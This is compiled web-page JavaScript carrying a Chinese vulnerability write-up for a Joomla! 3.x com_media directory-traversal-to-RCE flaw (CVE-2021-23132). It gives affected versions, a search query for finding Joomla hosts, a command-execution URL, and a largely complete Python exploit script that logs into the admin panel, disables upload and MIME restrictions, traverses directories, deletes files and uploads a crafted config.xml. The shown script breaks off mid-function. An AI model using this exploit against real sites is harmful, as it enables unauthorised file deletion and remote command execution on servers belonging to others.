import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as i,a as n,b as s,d as l,e as a}from"./app-58e4a7d6.js";const u={},c=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。 本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>3.0.0 &lt;= Joomla! &lt;= 3.9.24
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Joomla&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>获取超级管理员权限，触发RCE。</p><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://target/templates/protostar/error.php?cmd=ls
python3 cve-2021-23132.py -url http://192.168.72.140 -u admin -p 1234  -rce 1 -cmd ls
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,10),r={href:"http://cve-2021-23132.py",target:"_blank",rel:"noopener noreferrer"},d=a(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> argparse

<span class="token comment">#proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,&quot;https&quot;: &quot;http://127.0.0.1:8080&quot;} </span>
proxies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> lxml<span class="token punctuation">.</span>html
<span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;module &#39;lxml&#39; doesn&#39;t exist, type: pip3 install lxml&quot;</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">writeConfigFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Creating config.xml &quot;</span><span class="token punctuation">)</span>
    content<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;config&gt;
	&lt;fieldset 
		name=&quot;user_options&quot;
		label=&quot;COM_USERS_CONFIG_USER_OPTIONS&quot; &gt;
		&lt;field
			name=&quot;allowUserRegistration&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;new_usertype&quot;
			type=&quot;usergrouplist&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_DESC&quot;
			default=&quot;2&quot;
			checksuperusergroup=&quot;0&quot;
		/&gt;

		&lt;field
			name=&quot;guest_usergroup&quot;
			type=&quot;usergrouplist&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_DESC&quot;
			default=&quot;1&quot;
			checksuperusergroup=&quot;0&quot;
		/&gt;

		&lt;field
			name=&quot;sendpassword&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;useractivation&quot;
			type=&quot;list&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_DESC&quot;
			default=&quot;0&quot;
			&gt;
			&lt;option value=&quot;0&quot;&gt;JNONE&lt;/option&gt;
			&lt;option value=&quot;1&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_SELFACTIVATION&lt;/option&gt;
			&lt;option value=&quot;2&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_ADMINACTIVATION&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;mail_to_admin&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;0&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;captcha&quot;
			type=&quot;plugins&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_DESC&quot;
			folder=&quot;captcha&quot;
			filter=&quot;cmd&quot;
			useglobal=&quot;true&quot;
			&gt;
			&lt;option value=&quot;0&quot;&gt;JOPTION_DO_NOT_USE&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;frontend_userparams&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JSHOW&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JHIDE&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;site_language&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;0&quot;
			showon=&quot;frontend_userparams:1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JSHOW&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JHIDE&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;change_login_name&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;0&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

	&lt;/fieldset&gt;

	&lt;fieldset
		name=&quot;domain_options&quot;
		label=&quot;COM_USERS_CONFIG_DOMAIN_OPTIONS&quot;
		&gt;

		&lt;field
			name=&quot;domains&quot;
			type=&quot;subform&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_DOMAINS_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_DOMAINS_DESC&quot;
			multiple=&quot;true&quot;
			layout=&quot;joomla.form.field.subform.repeatable-table&quot;
			formsource=&quot;administrator/components/com_users/models/forms/config_domain.xml&quot;
		/&gt;
	&lt;/fieldset&gt;

	&lt;fieldset
		name=&quot;password_options&quot;
		label=&quot;COM_USERS_CONFIG_PASSWORD_OPTIONS&quot; &gt;
		&lt;field
			name=&quot;reset_count&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_DESC&quot;
			first=&quot;0&quot;
			last=&quot;20&quot;
			step=&quot;1&quot;
			default=&quot;10&quot;
		/&gt;

		&lt;field
			name=&quot;reset_time&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_DESC&quot;
			first=&quot;1&quot;
			last=&quot;24&quot;
			step=&quot;1&quot;
			default=&quot;1&quot;
		/&gt;

		&lt;field
			name=&quot;minimum_length&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH_DESC&quot;
			first=&quot;4&quot;
			last=&quot;99&quot;
			step=&quot;1&quot;
			default=&quot;4&quot;
		/&gt;

		&lt;field
			name=&quot;minimum_integers&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS_DESC&quot;
			first=&quot;0&quot;
			last=&quot;98&quot;
			step=&quot;1&quot;
			default=&quot;0&quot;
		/&gt;

		&lt;field
			name=&quot;minimum_symbols&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS_DESC&quot;
			first=&quot;0&quot;
			last=&quot;98&quot;
			step=&quot;1&quot;
			default=&quot;0&quot;
		/&gt;

		&lt;field
			name=&quot;minimum_uppercase&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE_DESC&quot;
			first=&quot;0&quot;
			last=&quot;98&quot;
			step=&quot;1&quot;
			default=&quot;0&quot;
		/&gt;

		&lt;field
			name=&quot;minimum_lowercase&quot;
			type=&quot;integer&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE_DESC&quot;
			first=&quot;0&quot;
			last=&quot;98&quot;
			step=&quot;1&quot;
			default=&quot;0&quot;
		/&gt;

	&lt;/fieldset&gt;

	&lt;fieldset
		name=&quot;user_notes_history&quot;
		label=&quot;COM_USERS_CONFIG_FIELD_NOTES_HISTORY&quot; &gt;

		&lt;field
			name=&quot;save_history&quot;
			type=&quot;radio&quot;
			label=&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_LABEL&quot;
			description=&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;0&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;history_limit&quot;
			type=&quot;number&quot;
			label=&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_LABEL&quot;
			description=&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_DESC&quot;
			filter=&quot;integer&quot;
			default=&quot;5&quot;
			showon=&quot;save_history:1&quot;
		/&gt;

	&lt;/fieldset&gt;

 	&lt;fieldset
		name=&quot;massmail&quot;
		label=&quot;COM_USERS_MASS_MAIL&quot;
		description=&quot;COM_USERS_MASS_MAIL_DESC&quot;&gt;

		&lt;field
 			name=&quot;mailSubjectPrefix&quot;
 			type=&quot;text&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_DESC&quot;
		/&gt;

 		&lt;field
 			name=&quot;mailBodySuffix&quot;
			type=&quot;textarea&quot;
			label=&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_LABEL&quot;
			description=&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_DESC&quot;
 			rows=&quot;5&quot;
 			cols=&quot;30&quot;
		/&gt;

	&lt;/fieldset&gt;

	&lt;fieldset
		name=&quot;debug&quot;
		label=&quot;COM_USERS_DEBUG_LABEL&quot;
		description=&quot;COM_USERS_DEBUG_DESC&quot;&gt;

		&lt;field
			name=&quot;debugUsers&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_DEBUG_USERS_LABEL&quot;
			description=&quot;COM_USERS_DEBUG_USERS_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;debugGroups&quot;
			type=&quot;radio&quot;
			label=&quot;COM_USERS_DEBUG_GROUPS_LABEL&quot;
			description=&quot;COM_USERS_DEBUG_GROUPS_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

	&lt;/fieldset&gt;

	&lt;fieldset name=&quot;integration&quot;
		label=&quot;JGLOBAL_INTEGRATION_LABEL&quot;
		description=&quot;COM_USERS_CONFIG_INTEGRATION_SETTINGS_DESC&quot;
	&gt;

		&lt;field
			name=&quot;integration_sef&quot;
			type=&quot;note&quot;
			label=&quot;JGLOBAL_SEF_TITLE&quot;
		/&gt;

		&lt;field
			name=&quot;sef_advanced&quot;
			type=&quot;radio&quot;
			class=&quot;btn-group btn-group-yesno btn-group-reversed&quot;
			default=&quot;0&quot;
			label=&quot;JGLOBAL_SEF_ADVANCED_LABEL&quot;
			description=&quot;JGLOBAL_SEF_ADVANCED_DESC&quot;
			filter=&quot;integer&quot;
			&gt;
			&lt;option value=&quot;0&quot;&gt;JGLOBAL_SEF_ADVANCED_LEGACY&lt;/option&gt;
			&lt;option value=&quot;1&quot;&gt;JGLOBAL_SEF_ADVANCED_MODERN&lt;/option&gt;
		&lt;/field&gt;

		&lt;field
			name=&quot;integration_customfields&quot;
			type=&quot;note&quot;
			label=&quot;JGLOBAL_FIELDS_TITLE&quot;
		/&gt;

		&lt;field
			name=&quot;custom_fields_enable&quot;
			type=&quot;radio&quot;
			label=&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_LABEL&quot;
			description=&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_DESC&quot;
			class=&quot;btn-group btn-group-yesno&quot;
			default=&quot;1&quot;
			&gt;
			&lt;option value=&quot;1&quot;&gt;JYES&lt;/option&gt;
			&lt;option value=&quot;0&quot;&gt;JNO&lt;/option&gt;
		&lt;/field&gt;

	&lt;/fieldset&gt;

	&lt;fieldset
		name=&quot;permissions&quot;
		label=&quot;JCONFIG_PERMISSIONS_LABEL&quot;
		description=&quot;JCONFIG_PERMISSIONS_DESC&quot;
		&gt;

		&lt;field
			name=&quot;rules&quot;
			type=&quot;rules&quot;
			label=&quot;JCONFIG_PERMISSIONS_LABEL&quot;
			filter=&quot;rules&quot;
			validate=&quot;rules&quot;
			component=&quot;com_users&quot;
			section=&quot;component&quot;
		/&gt;

	&lt;/fieldset&gt;
&lt;/config&gt;
&quot;&quot;&quot;</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close

<span class="token keyword">def</span> <span class="token function">extract_token</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&#39;name=&quot;([a-f0-9]{32})&quot; value=&quot;1&quot;&#39;</span><span class="token punctuation">,</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Cannot find CSRF token!\\n&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">try_admin_login</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> uname<span class="token punctuation">,</span> upass<span class="token punctuation">)</span><span class="token punctuation">:</span>
    admin_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php&#39;</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Getting token for Manager login&#39;</span><span class="token punctuation">)</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>admin_url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    token <span class="token operator">=</span> extract_token<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Logging in to Admin&#39;</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;username&#39;</span><span class="token punctuation">:</span> uname<span class="token punctuation">,</span>
        <span class="token string">&#39;passwd&#39;</span><span class="token punctuation">:</span> upass<span class="token punctuation">,</span>
        <span class="token string">&#39;task&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;login&#39;</span><span class="token punctuation">,</span>
        token<span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span>
    <span class="token punctuation">}</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>admin_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&#39;task=profile.edit&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Admin Login Failure!&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Admin Login Successfully!&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">check_admin</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url_check <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_config&amp;view=component&amp;component=com_media&amp;path=&#39;</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_check<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    token <span class="token operator">=</span> extract_token<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;[-] You are not admin account!&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> token


<span class="token keyword">def</span> <span class="token function">set_media_options</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> sess<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Setting media options&quot;</span><span class="token punctuation">)</span>
    newdata <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;jform[upload_extensions]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;xml,bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[upload_maxsize]&#39;</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[file_path]&#39;</span><span class="token punctuation">:</span> <span class="token builtin">dir</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[image_path]&#39;</span><span class="token punctuation">:</span> <span class="token builtin">dir</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[restrict_uploads]&#39;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[check_mime]&#39;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[image_extensions]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;bmp,gif,jpg,png&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[ignore_extensions]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[upload_mime]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;image/jpeg,image/gif,image/png,image/bmp,application/x-shockwave-flash,application/msword,application/excel,application/pdf,application/powerpoint,text/plain,application/x-zip&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[upload_mime_illegal]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/html&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token number">13</span><span class="token punctuation">,</span>
        <span class="token string">&#39;component&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;com_media&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;task&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;config.save.component.apply&#39;</span><span class="token punctuation">,</span>
        token<span class="token punctuation">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span>
    newdata<span class="token punctuation">[</span><span class="token string">&#39;task&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;config.save.component.apply&#39;</span>
    config_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_config&#39;</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>config_url<span class="token punctuation">,</span> data<span class="token operator">=</span>newdata<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&#39;jform[upload_extensions]&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Maybe failed to set media options...&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">traversal</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    shell_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_media&amp;view=mediaList&amp;tmpl=component&amp;folder=&#39;</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    page <span class="token operator">=</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> lxml<span class="token punctuation">.</span>html<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>page<span class="token punctuation">)</span>
    files <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">&quot;//input[@name=&#39;rm[]&#39;]/@value&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
    <span class="token keyword">pass</span>


<span class="token keyword">def</span> <span class="token function">removeFile</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    remove_path <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_media&amp;task=file.delete&amp;tmpl=index&amp;&#39;</span> <span class="token operator">+</span> token <span class="token operator">+</span> <span class="token string">&#39;=1&amp;folder=&amp;rm[]=&#39;</span> <span class="token operator">+</span> filename
    msg <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>remove_path<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
    page <span class="token operator">=</span> msg<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> lxml<span class="token punctuation">.</span>html<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>page<span class="token punctuation">)</span>
    file_remove <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">&quot;//div[@class=&#39;alert-message&#39;]/text()[1]&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span> <span class="token operator">+</span> <span class="token string">&#39;[Result]: &#39;</span> <span class="token operator">+</span> file_remove<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Uploading config.xml&quot;</span><span class="token punctuation">)</span>
    filename <span class="token operator">=</span> <span class="token string">&quot;config.xml&quot;</span>
    url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_media&amp;task=file.upload&amp;tmpl=component&amp;&#39;</span> <span class="token operator">+</span> token <span class="token operator">+</span> <span class="token string">&#39;=1&amp;format=html&amp;folder=&#39;</span>
    files <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;Filedata[]&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">&#39;text/xml&#39;</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>folder<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
